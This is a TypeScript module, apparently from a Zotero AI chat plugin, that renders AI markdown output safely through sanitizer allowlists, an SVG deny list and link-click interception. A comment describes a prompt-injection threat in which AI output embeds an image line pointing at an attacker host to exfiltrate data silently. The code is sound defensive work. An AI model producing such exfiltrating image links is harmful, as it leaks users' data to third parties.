// Markdown 渲染安全层 — PLAN §4.7 / INTERFACE §4.7。
// AI 产出一律：marked 解析（代码高亮）→ DOMPurify 消毒 → innerHTML。
// 本模块不 import Zotero 全局，node:test 可测（DOM 依赖经注入隔离）。
//
// 安全边界（一个不省）：
// 1. 消毒失败关闭（fail-closed）：未初始化 sanitizer 时 renderMarkdown 抛错，绝不放行未消毒 HTML。
// 2. DOMPurify hook 强制剥离 <a> 的 target 属性。
// 3. href 非 http(s) 绝对 URL 时整条剥除（javascript:/data:/vbscript:/相对路径均不放行）。
// 4. 渲染产物内所有 a 点击在 capture 阶段被拦截（preventDefault），
//    仅 http(s) 链接经桥 openExternal 交宿主外部打开——特权页面绝不发生远程导航。
// 5. 消毒走白名单制（CHAT_SANITIZE_CONFIG）：img/媒体等「无点击即自动发请求」的元素与
//    src/srcset/style 等属性一律不放行——AI 输出的远程图片不得把特权页面变成外发通道（重要 4）。
// 6. 原生 svg 走两层：自写 svgSanitize（主门，策略在它手里）→ DOMPurify SVG 兜底（次要防线，
//    见本文件 SVG_GUARD_CONFIG）。markdown 段同理有两层（marked 转义 + DOMPurify 白名单）。
import {
  SVG_ALLOWED_ATTRS,
  SVG_ALLOWED_TAGS,
  sanitizeSvg,
} from "./svgSanitize";
import { codeLineCount, isCodeOverflowing } from "./messageActions";
import { marked, type MarkedExtension } from "marked";
import hljs from "highlight.js/lib/core";
import bash from "highlight.js/lib/languages/bash";
import cpp from "highlight.js/lib/languages/cpp";
import css from "highlight.js/lib/languages/css";
import go from "highlight.js/lib/languages/go";
import java from "highlight.js/lib/languages/java";
import javascript from "highlight.js/lib/languages/javascript";
import json from "highlight.js/lib/languages/json";
import latex from "highlight.js/lib/languages/latex";
import markdown from "highlight.js/lib/languages/markdown";
import python from "highlight.js/lib/languages/python";
import r from "highlight.js/lib/languages/r";
import sql from "highlight.js/lib/languages/sql";
import typescript from "highlight.js/lib/languages/typescript";
import xml from "highlight.js/lib/languages/xml";
import yaml from "highlight.js/lib/languages/yaml";
import DOMPurify from "dompurify";

for (const [name, lang] of Object.entries({
  bash,
  cpp,
  css,
  go,
  java,
  javascript,
  json,
  latex,
  markdown,
  python,
  r,
  sql,
  typescript,
  xml,
  yaml,
})) {
  hljs.registerLanguage(name, lang as never);
}

// ---- 消毒器注入 ----
// 页面启动时注入真实 DOMPurify（见 createDomPurifySanitizer）；Node 测试环境无 DOM，
// 不初始化即 fail-closed。中间层用可注入点隔离 DOM 依赖，测试可注入校验用替身。

export type Sanitizer = (html: string) => string;

let sanitizer: Sanitizer | null = null;

export function setSanitizer(s: Sanitizer | null): void {
  sanitizer = s;
}

export function escapeHtml(text: string): string {
  return text
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

/** mermaid 代码块的标记类：源码态留在 HTML 里（渲染失败即源码，不白屏），
 *  页面侧按它找到并异步替换为渲染图（见 mermaidRender.ts） */
export const MERMAID_BLOCK_CLASS = "mermaid-block";

/** 原生 <svg> 消毒后内联渲染时的包裹类 */
export const SVG_BLOCK_CLASS = "md-svg";

/** 代码块折叠容器的类名（R8：AI 回复里超行的代码块默认折起，见 foldCodeBlocks） */
export const CODE_FOLD_CLASS = "code-fold";

// R22：删除线只认成对双波浪线（GFM 原规则为 `~~?`，单波浪线也会成对吃掉，
// 把「~7%升至~14%」这类约数写法划成删除线）。其余写法与 marked 内建 del 规则一致。
const DOUBLE_TILDE_DEL =
  /^(~~)(?=[^\s~])((?:\\.|[^\\])*?(?:\\.|[^\s~\\]))\1(?=[^~]|$)/;

/**
 * marked 基础配置：GFM + 单换行转 <br>（聊天场景），删除线只认双波浪线，代码块走 highlight.js。
 * 导出供测试新建对照实例（不含上标渲染），与本模块的全局实例逐字比对。
 */
export const MARKED_BASE_EXTENSION: MarkedExtension = {
  gfm: true,
  breaks: true,
  tokenizer: {
    del(src) {
      const cap = DOUBLE_TILDE_DEL.exec(src);
      if (!cap) return undefined;
      return {
        type: "del",
        raw: cap[0],
        text: cap[2],
        tokens: this.lexer.inlineTokens(cap[2]),
      };
    },
  },
  renderer: {
    code(token) {
      const lang = (token.lang || "").trim().split(/\s+/)[0];
      const known = lang !== "" && hljs.getLanguage(lang) != null;
      const body = known
        ? hljs.highlight(token.text, { language: lang, ignoreIllegals: true })
            .value
        : escapeHtml(token.text);
      const cls = known
        ? ` class="hljs language-${escapeHtml(lang)}"`
        : ' class="hljs"';
      // mermaid 块：源码照常落进 DOM（转义文本，零执行面），页面对它做二次渲染
      const preCls =
        lang.toLowerCase() === "mermaid"
          ? ` class="${MERMAID_BLOCK_CLASS}"`
          : "";
      return `<pre${preCls}><code${cls}>${body}\n</code></pre>`;
    },
  },
};

// ---- R22：插入符上标（规则全文见 docs/DESIGN.md 2.6）----
// 上标在文本渲染阶段处理：分词结果与不装上标时相同，只在输出一段普通文字时改写其中成立的 `^`。

// `^` 的前一个字符须为拉丁字母、数字、希腊字母、`)` 或 `]`（单个 UTF-16 码元判定）
const SUP_LEAD_CHAR = /^[\p{Script=Latin}\p{Script=Greek}0-9)\]]$/u;
// 普通形式内容的第一个字符：拉丁字母、希腊字母、数字或正负号（`ok^_^`、`x^😀` 不触发）
const SUP_FIRST_CHAR = /^[\p{Script=Latin}\p{Script=Greek}0-9+\-−]$/u;
// 花括号形式 ^{内容}：内容 1–200 字符、不含换行，到第一个 `}` 为止；无闭合则不成上标
const SUP_BRACED_MAX = 200;
const SUP_SIGN_CHARS = "+-−";
// 中日韩文字与全角标点（停止字符、回看边界、并入条件共用）
const SUP_CJK_SET =
  "\\p{Script=Han}\\p{Script=Hiragana}\\p{Script=Katakana}\\p{Script=Hangul}" +
  "\\u3000-\\u303f\\uff00-\\uffef\\u2018\\u2019\\u201c\\u201d\\u2026\\u2014";
// 字母形式停止字符：空白、中日韩文字、全角标点，以及半角 ( ) [ ] , ; ^ * $ < | 反引号 = { } \ " '
const SUP_STOP_SET = `\\s${SUP_CJK_SET}()[\\],;^*$<|\`={}\\\\"'`;
// 字母形式：到第一个停止字符为止（内部的 + - / 属于内容，供 Apc^Min/+ 这类基因型写法）
const SUP_LETTER = new RegExp(`[^${SUP_STOP_SET}]+`, "uy");
// 尾随正负号并入条件：其后为结尾、空白、中日韩文字、全角标点或半角 ) ] , ; . : ! ?
const SUP_AFTER_SIGN = new RegExp(`(?:$|[\\s${SUP_CJK_SET})\\],;.:!?])`, "uy");
// 闭合 `^` 被吃掉的条件：其后为结尾、停止字符或 . : ! ?
const SUP_AFTER_CLOSE = new RegExp(`(?:$|[${SUP_STOP_SET}.:!?])`, "uy");
// 路径回看：从 `^` 向前至多 64 个字符，到空白、中日韩文字、全角标点或半角 ; , ( [ 为止
const SUP_LOOKBACK_MAX = 64;
const SUP_LOOKBACK_STOP = new RegExp(`^[\\s${SUP_CJK_SET};,(\\[]$`, "u");

// 与 marked 内建文本渲染相同的转义（不重复转义已有的字符实体）
const TEXT_ESCAPE = /[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/g;
const TEXT_ESCAPE_TEST = /[<>"'&]/;
// 内建转义视为字符实体而不再转义的形态（去掉末尾 `;`）：`&` 后接 #数字、#x十六进制或单词字符
const ENTITY_BODY = /^&(?:#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+)$/;
const TEXT_ESCAPE_MAP: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
};
function escapeTextLikeMarked(text: string): string {
  return text.replace(TEXT_ESCAPE, (ch) => TEXT_ESCAPE_MAP[ch]);
}

function matchesAt(sticky: RegExp, text: string, pos: number): boolean {
  sticky.lastIndex = pos;
  return sticky.test(text);
}

function execAt(sticky: RegExp, text: string, pos: number): string | null {
  sticky.lastIndex = pos;
  const m = sticky.exec(text);
  return m ? m[0] : null;
}

// ASCII 快速路径：多数字符是 ASCII，避免逐字符跑 Unicode 属性正则
function isAsciiAlnum(code: number): boolean {
  return (
    (code >= 48 && code <= 57) ||
    (code >= 65 && code <= 90) ||
    (code >= 97 && code <= 122)
  );
}

function isDigitAt(text: string, i: number): boolean {
  const code = text.charCodeAt(i);
  return code >= 48 && code <= 57;
}

/**
 * 数字形式：可选前导正负号 + 数字 + 可选小数部分（小数点后至少一位数字）。
 * 返回内容结束下标；start 处不是数字形式时返回 -1
 */
function scanSupNumeric(text: string, start: number): number {
  let i = start;
  if (SUP_SIGN_CHARS.includes(text.charAt(i))) i++;
  if (!isDigitAt(text, i)) return -1;
  while (isDigitAt(text, i)) i++;
  if (text.charAt(i) === "." && isDigitAt(text, i + 1)) {
    i++;
    while (isDigitAt(text, i)) i++;
  }
  return i;
}

function isSupLeadChar(ch: string): boolean {
  if (ch === "") return false;
  const code = ch.charCodeAt(0);
  if (code < 128) return isAsciiAlnum(code) || code === 41 || code === 93; // ) ]
  return SUP_LEAD_CHAR.test(ch);
}

function isSupFirstChar(ch: string): boolean {
  const code = ch.charCodeAt(0);
  if (code < 128) return isAsciiAlnum(code) || code === 43 || code === 45; // + -
  return SUP_FIRST_CHAR.test(ch);
}

/** text[caretIdx] 前回看（同段文字内、至多 64 字符）是否先遇到 `/` 或 `\`（路径与地址） */
function looksLikePath(text: string, caretIdx: number): boolean {
  const stop = Math.max(0, caretIdx - SUP_LOOKBACK_MAX);
  for (let i = caretIdx - 1; i >= stop; i--) {
    const code = text.charCodeAt(i);
    if (code < 128) {
      if (code === 47 || code === 92) return true; // / \
      // 空白与 ; , ( [
      if (
        code === 32 ||
        (code >= 9 && code <= 13) ||
        code === 59 ||
        code === 44 ||
        code === 40 ||
        code === 91
      ) {
        return false;
      }
      continue;
    }
    let ch = text.charAt(i);
    // 低位代理与其高位代理合成一个字符再判定（扩展区汉字等）
    if (code >= 0xdc00 && code <= 0xdfff && i > stop) {
      const high = text.charCodeAt(i - 1);
      if (high >= 0xd800 && high <= 0xdbff) {
        ch = text.slice(i - 1, i + 1);
        i--;
      }
    }
    if (SUP_LOOKBACK_STOP.test(ch)) return false;
  }
  return false;
}

/**
 * 把一段未转义的普通文字渲染为 HTML：成立的插入符上标输出为 `<sup>转义后的内容</sup>`，
 * 其余文字按 marked 内建文本渲染的方式转义。前一个字符与路径回看只在本段文字内取。
 * 单次从左到右扫描；每个 `^` 处的额外判定有常数上界（回看 64、花括号 200 字符）。
 */
export function renderCaretSup(text: string): string {
  // 整段无需转义的字符时跳过逐段转义（常见情形）
  const escape = TEXT_ESCAPE_TEST.test(text)
    ? escapeTextLikeMarked
    : (segment: string) => segment;
  let out = "";
  let plainStart = 0; // 尚未输出的普通文字起点
  // 花括号上标之后紧跟的 `^`：前一个字符取花括号内容的末字符
  let bracedEnd = -1;
  let bracedLastChar = "";
  let caret = text.indexOf("^");
  while (caret >= 0) {
    const leadChar =
      caret === bracedEnd ? bracedLastChar : caret > 0 ? text[caret - 1] : "";
    let content: string | null = null;
    let consumedEnd = caret + 1; // 上标成立时，原文被替换部分的结束位置
    if (
      isSupLeadChar(leadChar) &&
      caret + 1 < text.length &&
      !looksLikePath(text, caret)
    ) {
      const next = text[caret + 1];
      if (next === "{") {
        const limit = Math.min(text.length, caret + 3 + SUP_BRACED_MAX);
        for (let j = caret + 2; j < limit; j++) {
          const ch = text[j];
          if (ch === "\n") break;
          if (ch === "}") {
            if (j > caret + 2) {
              content = text.slice(caret + 2, j);
              consumedEnd = j + 1;
            }
            break;
          }
        }
        if (content !== null) {
          bracedEnd = consumedEnd;
          bracedLastChar = content[content.length - 1];
        }
      } else if (isSupFirstChar(next)) {
        const numericEnd = scanSupNumeric(text, caret + 1);
        if (numericEnd > 0) {
          content = text.slice(caret + 1, numericEnd);
          // 尾随正负号按 SUP_AFTER_SIGN 条件并入（Ca^2+浓度 并入，x^2+y、x^2+(y) 不并入）
          const after = caret + 1 + content.length;
          if (
            after < text.length &&
            SUP_SIGN_CHARS.includes(text[after]) &&
            matchesAt(SUP_AFTER_SIGN, text, after + 1)
          ) {
            content += text[after];
          }
        } else {
          let letter = execAt(SUP_LETTER, text, caret + 1) ?? "";
          // 先做实体截断：字母形式以 `;` 为停止字符，内容可能停在实体中间（`a^b&amp;c` 停在
          // `&amp`）。内容末尾是实体主体且其后紧跟 `;` 时，把内容截到该 `&` 之前，实体整体留在
          // 上标外，不被切开转义
          if (text[caret + 1 + letter.length] === ";") {
            const amp = letter.lastIndexOf("&");
            if (amp >= 0 && ENTITY_BODY.test(letter.slice(amp))) {
              letter = letter.slice(0, amp);
            }
          }
          // 再剥末尾的 . : ! ?：属于句读，留在上标之外（含截断后新暴露的末尾，如 a^b.&amp;c）
          let end = letter.length;
          while (end > 0 && ".:!?".includes(letter[end - 1])) end--;
          // 首字符已判定为字母/数字/正负号（不是 & 或句读），截断与剥除后至少余一个字符；
          // end 为 0 的分支执行不到，仅作防御
          content = end > 0 ? letter.slice(0, end) : null;
        }
        if (content !== null) {
          consumedEnd = caret + 1 + content.length;
          // 闭合 ^：其后为结尾、停止字符或 . : ! ? 时吃掉；否则保留，照常重新判定
          if (
            text[consumedEnd] === "^" &&
            matchesAt(SUP_AFTER_CLOSE, text, consumedEnd + 1)
          ) {
            consumedEnd++;
          }
        }
      }
    }
    if (content !== null) {
      out += `${escape(text.slice(plainStart, caret))}<sup>${escape(content)}</sup>`;
      plainStart = consumedEnd;
      caret = text.indexOf("^", consumedEnd);
    } else {
      caret = text.indexOf("^", caret + 1);
    }
  }
  return out + escape(text.slice(plainStart));
}

marked.use(MARKED_BASE_EXTENSION);
marked.use({
  renderer: {
    // 普通文字片段：含 `^` 时交给 renderCaretSup；带子 token、已转义（原始 HTML 块内）
    // 或不含 `^` 的片段返回 false，交回内建渲染，输出与不装上标时逐字相同
    text(token) {
      if (
        ("tokens" in token && token.tokens) ||
        ("escaped" in token && token.escaped) ||
        !token.text.includes("^")
      ) {
        return false;
      }
      return renderCaretSup(token.text);
    },
  },
});

/** marked 解析结果（未消毒！仅供测试/调试观察，UI 一律走 renderMarkdown） */
export function parseMarkdownUnsafe(md: string): string {
  return marked.parse(md, { async: false });
}

export interface MarkdownSegment {
  kind: "md" | "svg";
  text: string;
}

/** 找 `</svg>` 配对位置（按嵌套计数；`<svg:…` 这类带前缀的不算）；-1 = 没有闭合 */
function findSvgEnd(s: string, from: number): number {
  const re = /<\/?svg(?=[\s/>])/gi;
  re.lastIndex = from;
  let depth = 0;
  let m: RegExpExecArray | null;
  while ((m = re.exec(s)) !== null) {
    if (m[0][1] === "/") {
      depth--;
      if (depth === 0) {
        const gt = s.indexOf(">", m.index);
        return gt === -1 ? -1 : gt + 1;
      }
    } else {
      depth++;
    }
  }
  return -1;
}

/** 认作「这是张图」的围栏标签（真实使用里 AI 常把 svg 包进 ```html / ```svg） */
const GRAPHIC_FENCE_INFO = new Set(["svg", "xml", "html"]);

/** 该围栏内容是否「整整齐齐就一个 svg 元素」（前后无别的文本）→ 是则按图形渲染 */
function fenceIsSingleSvg(body: string): string | null {
  const text = body.trim();
  if (!/^<svg(?=[\s/>])/i.test(text)) {
    return null;
  }
  const end = findSvgEnd(text, 0);
  return end !== -1 && end === text.length ? text : null;
}

interface FenceState {
  ch: string;
  len: number;
  info: string;
  text: string;
  body: string;
}

/**
 * 把 markdown 源码切成「普通 markdown」与「原生 <svg> 块」两类片段（纯文本逻辑，node 可测）。
 *
 * 两种形态都认，其余一律不动（交给原管线，DOMPurify 按老口径处理）：
 * 1. 行首（≤3 空格缩进）的裸 `<svg>…</svg>`：AI 把整幅图单独放一段的形态；
 * 2. 标签为 svg/xml/html 的代码围栏，且**围栏内容整整齐齐只有一个 svg 元素**——
 *    这是实测到的真实习惯（AI 会把 svg 包进 ```html 围栏），不认的话功能在真实使用里
 *    基本不会触发。围栏里夹着别的 HTML/文本则不认（那是代码示例，不是图）。
 * 行内出现（`看这个 <svg …>`）、4 空格缩进（缩进代码块）都不动。
 */
export function splitSvgBlocks(md: string): MarkdownSegment[] {
  const segments: MarkdownSegment[] = [];
  let buf = "";
  let fence: FenceState | null = null;
  let pos = 0;
  const flushBuf = (): void => {
    if (buf !== "") {
      segments.push({ kind: "md", text: buf });
      buf = "";
    }
  };
  while (pos <= md.length) {
    const nl = md.indexOf("\n", pos);
    const lineEnd = nl === -1 ? md.length : nl;
    const line = md.slice(pos, lineEnd);
    const lineText = line + (nl === -1 ? "" : "\n");
    const fenceM = /^ {0,3}(`{3,}|~{3,})(.*)$/.exec(line);
    if (fenceM) {
      const ch = fenceM[1][0];
      const len = fenceM[1].length;
      if (fence === null) {
        fence = {
          ch,
          len,
          info: (fenceM[2] || "").trim().split(/\s+/)[0].toLowerCase(),
          text: lineText,
          body: "",
        };
      } else if (
        fence.ch === ch &&
        len >= fence.len &&
        line.trim() === fenceM[1]
      ) {
        fence.text += lineText;
        const graphic = GRAPHIC_FENCE_INFO.has(fence.info)
          ? fenceIsSingleSvg(fence.body)
          : null;
        if (graphic !== null) {
          flushBuf();
          segments.push({ kind: "svg", text: graphic });
        } else {
          buf += fence.text;
        }
        fence = null;
      } else {
        fence.text += lineText;
        fence.body += lineText;
      }
    } else if (fence === null) {
      const svgM = /^ {0,3}<svg(?=[\s/>])/i.exec(line);
      const svgStart = svgM ? pos + svgM[0].lastIndexOf("<svg") : -1;
      if (svgStart !== -1) {
        const end = findSvgEnd(md, svgStart);
        if (end !== -1) {
          buf += md.slice(pos, svgStart);
          flushBuf();
          segments.push({ kind: "svg", text: md.slice(svgStart, end) });
          pos = end;
          continue;
        }
      }
      buf += lineText;
    } else {
      fence.text += lineText;
      fence.body += lineText;
    }
    if (nl === -1) {
      break;
    }
    pos = nl + 1;
  }
  if (fence !== null) {
    buf += fence.text; // 未闭合的围栏：按原文交回原管线
  }
  flushBuf();
  return segments;
}

/** 源码态展示（svg 消毒后什么都不剩 / 笔记落库路径）：转义文本的代码块，零执行面 */
function svgSourceBlock(source: string): string {
  return `<pre><code class="hljs">${escapeHtml(source)}</code></pre>`;
}

// ---- SVG 第二道防线（纵深防御）----
// markdown 段有双层（marked 转义 + DOMPurify 白名单）；svg 段不能只有自写消毒器单层——
// 它是自写代码，理应有个成熟库兜底：消毒产物**再过一道 DOMPurify**（同样注入式，页面侧真实生效）。
// 定位：自写 svgSanitize 是主门（策略全在它手里），这层是「主门万一漏了，再剥一层」。
// 输入已是白名单产物，所以这层只会做减法，永不放行新东西；返回空串 = 没剩下可渲染内容 → 退回源码。

export type SvgGuard = (svg: string) => string;

let svgGuard: SvgGuard | null = null;

export function setSvgGuard(g: SvgGuard | null): void {
  svgGuard = g;
}

/** 第二道兜底：未注入（node 测试路径）则跳过——主门是自写消毒器，本层是增补不是必需 */
export function guardSvg(svg: string): string {
  if (svg === "" || svgGuard === null) {
    return svg;
  }
  const out = svgGuard(svg);
  return typeof out === "string" ? out : "";
}

/**
 * 第二道防线的 DOMPurify 配置。
 *
 * 为什么不用 `USE_PROFILES: {svg: true}`：它在源码里会**重置** ALLOWED_TAGS/ALLOWED_ATTR
 * （`ALLOWED_TAGS = addToSet({}, text)` 那一步），我们显式传的白名单会被丢掉；而 profile
 * 本身还放行 `image`（可外链加载）/`a`/`clipPath`/`switch`/`symbol`/`pattern`/`mask`/`textPath`
 * 等我们判定必须丢的东西。所以这里走等效形态：**显式白名单钉死到与自写器一致**（大小写作
 * 小写——DOMPurify 比对属性/标签名时统一小写），再叠一层 FORBID_TAGS 显式拉黑危险族
 * （自文档化：即便日后有人放宽 ALLOWED_TAGS，这一层仍拦得住）。
 */
export const SVG_GUARD_CONFIG: {
  ALLOWED_TAGS: string[];
  ALLOWED_ATTR: string[];
  FORBID_TAGS: string[];
  FORBID_ATTR: string[];
  ALLOW_DATA_ATTR: boolean;
} = {
  // 与 svgSanitize 的标签白名单一致（+style：mermaid 配色必需，其内容已被自写器逐条校验）
  ALLOWED_TAGS: [...SVG_ALLOWED_TAGS, "style"].map((t) => t.toLowerCase()),
  ALLOWED_ATTR: [...SVG_ALLOWED_ATTRS].map((a) => a.toLowerCase()),
  FORBID_TAGS: [
    "script",
    "use",
    "image",
    "foreignobject",
    "iframe",
    "object",
    "embed",
    "filter",
    "animate",
    "animatetransform",
    "animatemotion",
    "animatecolor",
    "set",
    "a",
    "switch",
    "symbol",
    "pattern",
    "mask",
    "clippath",
    "textpath",
    "metadata",
    "font",
    "glyph",
    "tref",
    "mpath",
    "view",
  ],
  FORBID_ATTR: [
    "href",
    "xlink:href",
    "src",
    "srcset",
    "data",
    "action",
    "formaction",
    "ping",
  ],
  ALLOW_DATA_ATTR: false,
};

/** 页面启动时调用：装好 DOMPurify 的 SVG 兜底层（配置见 SVG_GUARD_CONFIG） */
export function createDomPurifySvgGuard(): SvgGuard {
  if (!DOMPurify.isSupported) {
    throw new Error("DOMPurify unsupported in this environment");
  }
  return (svg: string) =>
    DOMPurify.sanitize(svg, {
      ALLOWED_TAGS: [...SVG_GUARD_CONFIG.ALLOWED_TAGS],
      ALLOWED_ATTR: [...SVG_GUARD_CONFIG.ALLOWED_ATTR],
      FORBID_TAGS: [...SVG_GUARD_CONFIG.FORBID_TAGS],
      FORBID_ATTR: [...SVG_GUARD_CONFIG.FORBID_ATTR],
      ALLOW_DATA_ATTR: SVG_GUARD_CONFIG.ALLOW_DATA_ATTR,
    });
}

export interface RenderMarkdownOptions {
  /**
   * 原生 <svg> 是否消毒后内联渲染。默认 true（聊天页）；
   * 笔记落库走 false —— 宿主 htmlSanitize 会把 <svg> 整段丢弃，内联渲染等于把图从笔记里
   * 悄悄删掉，源码文本反而保住了信息。
   */
  renderSvg?: boolean;
}

/**
 * 完整渲染管线：原生 svg 分段 → 自写消毒器 → DOMPurify 兜底 → marked → sanitizer → HTML 字符串。
 * markdown 段的 sanitizer 未初始化时抛错（fail-closed），绝不让未消毒 HTML 到达 innerHTML。
 * svg 段的第二道兜底未注入时跳过（主门自写消毒器仍生效）。
 * mermaid 块这层只是「带标记的源码」（转义文本），真正的渲染是页面侧的二次替换。
 */
export function renderMarkdown(
  md: string,
  opts: RenderMarkdownOptions = {},
): string {
  if (!sanitizer) {
    throw new Error("markdown sanitizer not initialized (fail-closed)");
  }
  const renderSvg = opts.renderSvg !== false;
  let out = "";
  for (const seg of splitSvgBlocks(md)) {
    if (seg.kind === "md") {
      out += sanitizer(parseMarkdownUnsafe(seg.text));
      continue;
    }
    // 主门（自写）不通过 → 空串；主门通过但兜底层剥空 → 同样退回源码展示
    const svg = renderSvg ? guardSvg(sanitizeSvg(seg.text)) : "";
    out +=
      svg !== ""
        ? `<div class="${SVG_BLOCK_CLASS}">${svg}</div>`
        : svgSourceBlock(seg.text);
  }
  return out;
}

// ---- R8 代码块折叠（AI 回复里超 CODE_COLLAPSE_LINE_THRESHOLD 行的代码块默认折起）----

/** 代码块渲染产物形状由本文件的 code renderer 决定：<pre[ attrs]><code[ attrs]>…</code></pre> */
const CODE_BLOCK_RE = /<pre([^>]*)><code([^>]*)>([\s\S]*?)<\/code><\/pre>/g;
/** 语言名的唯一合法形状（贴进 HTML 前先过它；渲染产物虽已是消毒结果，字符串拼接不做假设） */
const LANG_TOKEN_RE = /\blanguage-([A-Za-z0-9#+._-]{1,32})/;

/**
 * 折叠容器：原生 <details>——展开/收起/键盘可达都是浏览器给的，折叠态是 **DOM 视图态**
 * （重画/切会话即回到默认折起，同一条消息里各块各自独立）。头部一行：语言 · 展开代码（N 行）/ 收起。
 */
function codeFoldHtml(lang: string, lines: number, block: string): string {
  const langHtml = lang === "" ? "" : `<span class="code-lang">${lang}</span>`;
  return (
    `<details class="${CODE_FOLD_CLASS}"><summary>${langHtml}` +
    `<span class="code-fold-open">展开代码（${lines} 行）</span>` +
    `<span class="code-fold-close">收起</span></summary>${block}</details>`
  );
}

/**
 * 把渲染产物里超阈值（> 20 行）的代码块包进可折叠容器，其余一字不动；块与块各自独立。
 * 输入是**消毒后**的 HTML：本函数只往里贴自家静态标记 + 校验过的语言名 + 行数，代码内容原样搬。
 * details/summary 不在 CHAT_SANITIZE_CONFIG 白名单里是故意的——折叠容器在消毒之后由本函数贴，
 * AI 输出里自己写 <details> 进不来；白名单因此不必放宽。
 * mermaid 块不折（它会被 enhanceMermaidBlocks 换成图）。
 */
export function foldCodeBlocks(html: string): string {
  return html.replace(CODE_BLOCK_RE, (block, preAttrs, codeAttrs, body) => {
    if (/\bmermaid-block\b/.test(preAttrs)) {
      return block;
    }
    if (!isCodeOverflowing(body)) {
      return block;
    }
    const m = LANG_TOKEN_RE.exec(codeAttrs);
    return codeFoldHtml(m === null ? "" : m[1], codeLineCount(body), block);
  });
}

/**
 * 聊天页渲染入口（消息列表专线）：正文照旧整条渲染；代码块**流式期间不折**（回答在增长，
 * 边流边折会每来一个 delta 跳一次），回合/块结束后（streaming=false）才按阈值折。
 * 笔记/导出等既有路径仍走 renderMarkdown（原文，不含折叠容器）。
 */
export function renderChatMarkdown(md: string, streaming: boolean): string {
  const html = renderMarkdown(md);
  return streaming ? html : foldCodeBlocks(html);
}

// ---- URL 安全判定（UI 侧 openExternal 前置过滤 + DOMPurify hook 共用）----

/** 仅接受绝对 http(s) URL —— 其余（javascript:/data:/相对路径等）一律不放行 */
export function isSafeExternalUrl(url: string): boolean {
  try {
    const u = new URL(url);
    return u.protocol === "https:" || u.protocol === "http:";
  } catch {
    return false;
  }
}

// ---- DOMPurify hooks ----
// hook 操作的只是 Element API 表面（tagName/getAttribute/removeAttribute），
// node:test 用最小假节点即可验证真实 hook 逻辑。

export interface SanitizeHookNode {
  tagName: string;
  getAttribute(name: string): string | null;
  removeAttribute(name: string): void;
}

/** afterSanitizeAttributes hook：剥 <a> 的 target；href 非 http(s) 绝对 URL 则整条剥除 */
export function stripAnchorTargetHook(node: SanitizeHookNode): void {
  if (node.tagName !== "A") {
    return;
  }
  node.removeAttribute("target");
  const href = node.getAttribute("href");
  if (href !== null && !isSafeExternalUrl(href)) {
    node.removeAttribute("href");
  }
}

/**
 * 聊天侧消毒白名单（**白名单制**，只留 markdown 渲染真正产出的东西）。
 * 为什么不是「默认白名单 + 拉黑几个」：DOMPurify 默认允许 img/picture/source/video/audio/style
 * 以及 src/srcset/poster/background/style 属性——这些元素/属性会在**无用户点击**的情况下自动
 * 请求远程地址。本页是 chrome:// 特权页面，AI 输出又受提示词注入影响，`![](https://attacker/?d=…)`
 * 或裸 `<img src=…>` 就是一条静默数据外发/打点通道（安全审计 重要 4）。本页从不需要远程图片，
 * 一律按默认拒绝处理；被拒标签的文字内容仍保留（DOMPurify KEEP_CONTENT 默认 true），不会吞正文。
 * 链接仍走 href（点击由 capture 拦截 + openExternal 交宿主）——「有交互才外发」的出口不变。
 */
export const CHAT_SANITIZE_CONFIG: {
  ALLOWED_TAGS: string[];
  ALLOWED_ATTR: string[];
} = {
  // marked（GFM/breaks）+ highlight.js 的产物集合：span/class 是 hljs 高亮用的
  ALLOWED_TAGS: [
    "a",
    "b",
    "blockquote",
    "br",
    "code",
    "del",
    "em",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "hr",
    "i",
    "ins",
    "li",
    "ol",
    "p",
    "pre",
    "small",
    "span",
    "strong",
    "sub",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "tr",
    "ul",
  ],
  ALLOWED_ATTR: [
    "href",
    "title",
    "class",
    "start",
    "align",
    "colspan",
    "rowspan",
  ],
};

/** 页面启动时调用：装好 DOMPurify 消毒器（白名单配置 + 安全 hook），返回给 setSanitizer 用 */
export function createDomPurifySanitizer(): Sanitizer {
  if (!DOMPurify.isSupported) {
    throw new Error("DOMPurify unsupported in this environment");
  }
  DOMPurify.addHook("afterSanitizeAttributes", (node) =>
    stripAnchorTargetHook(node as unknown as SanitizeHookNode),
  );
  return (html: string) =>
    DOMPurify.sanitize(html, {
      ALLOWED_TAGS: [...CHAT_SANITIZE_CONFIG.ALLOWED_TAGS],
      ALLOWED_ATTR: [...CHAT_SANITIZE_CONFIG.ALLOWED_ATTR],
    });
}

// ---- 链接点击拦截（§4.7：capture 阶段，渲染产物内所有 a 点击）----

export interface ClickEventLike {
  target: unknown;
  preventDefault(): void;
  stopPropagation(): void;
}

interface AnchorLike {
  getAttribute(name: string): string | null;
}

interface ClosestTarget {
  closest(selector: string): AnchorLike | null;
}

/**
 * 挂在渲染容器上的 capture click 处理。返回应外发的 URL（http/https），否则 null。
 * 任何 a 点击（含 javascript:/相对路径）一律 preventDefault——特权页面内绝不导航。
 * 纯逻辑：event 只用到 target/preventDefault/stopPropagation，node:test 用假事件可测。
 */
export function handleContentClick(evt: ClickEventLike): string | null {
  const target = evt.target as ClosestTarget | null;
  const anchor =
    target && typeof target.closest === "function" ? target.closest("a") : null;
  if (!anchor) {
    return null;
  }
  evt.preventDefault();
  evt.stopPropagation();
  const href = anchor.getAttribute("href");
  if (href === null || !isSafeExternalUrl(href)) {
    return null; // 已拦截但不外发（宿主契约：非 http(s) 忽略）
  }
  return href;
}
